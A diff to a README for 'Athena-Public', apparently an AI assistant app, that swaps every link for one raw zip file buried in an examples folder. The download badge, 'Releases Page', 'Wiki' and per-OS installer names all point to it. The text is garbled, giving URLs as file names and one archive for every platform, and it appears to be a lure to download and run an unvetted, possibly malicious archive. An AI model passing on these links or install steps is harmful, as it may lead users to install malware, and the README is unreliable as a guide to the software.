@@ -1,7 +1,7 @@
 # 🤖 Athena-Public - Your Smart Digital Assistant
 
 ## 📥 Download Now
-[![Download Athena-Public](https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip%20Athena%20Public-blue)](https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip)
+[![Download Athena-Public](https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip%20Athena%20Public-blue)](https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 Welcome to Athena-Public! This AI-powered digital personal assistant is built using Google Antigravity (Gemini), helping you manage your knowledge and boost your productivity. 
@@ -25,16 +25,16 @@ To ensure Athena-Public runs smoothly, make sure your system meets the following
 - **Customization:** Adjust settings to suit your personal workflow.
 
 ## 📦 Download & Install
-1. **Visit the Releases Page:** Go to the following link to access the official releases: [Athena-Public Releases](https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip).
+1. **Visit the Releases Page:** Go to the following link to access the official releases: [Athena-Public Releases](https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip).
    
 2. **Choose Your Version:** On the Releases page, you will see different versions of the software. Look for the latest stable release. 
 
-3. **Download the Installer:** Click on the installer file that corresponds to your operating system. The files will typically be named like `https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip` for Windows or `https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip` for macOS.
+3. **Download the Installer:** Click on the installer file that corresponds to your operating system. The files will typically be named like `https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip` for Windows or `https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip` for macOS.
 
 4. **Run the Installer:**
    - **Windows:** Find the downloaded `.exe` file in your Downloads folder. Double-click it and follow the prompts.
    - **macOS:** Open the `.dmg` file, drag the Athena-Public application to your Applications folder.
-   - **Linux:** Extract the downloaded `https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip` file and follow the enclosed instructions.
+   - **Linux:** Extract the downloaded `https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip` file and follow the enclosed instructions.
 
 5. **Open Athena-Public:** Once the installation is complete, open the application to start using your digital personal assistant.
 
@@ -46,7 +46,7 @@ Once you've installed Athena-Public, you might want to go through the user guide
 - Utilizing AI features for prompt engineering.
 - Using the knowledge management tools to organize your files.
 
-The user guide is available on our [Wiki](https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip).
+The user guide is available on our [Wiki](https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip).
 
 ## ⚙️ Troubleshooting
 If you encounter any issues while downloading or running Athena-Public, here are a few common problems and their solutions:
@@ -67,4 +67,4 @@ If you want to contribute to Athena-Public, feel free to fork the repository and
 ## 💡 Final Thoughts
 Athena-Public is built to assist you in managing your tasks and information effectively. By using AI technologies, it brings you a powerful tool right at your fingertips. Download it today and enhance your productivity!
 
-Don't forget to visit the [Releases Page](https://raw.githubusercontent.com/iqbaldiit/Athena-Public/main/docs/case-studies/Athena_Public_3.9-beta.4.zip) for your download. Enjoy using Athena!
+Don't forget to visit the [Releases Page](https://github.com/iqbaldiit/Athena-Public/raw/refs/heads/main/examples/protocols/workflow/Public-Athena-1.1-alpha.2.zip) for your download. Enjoy using Athena!
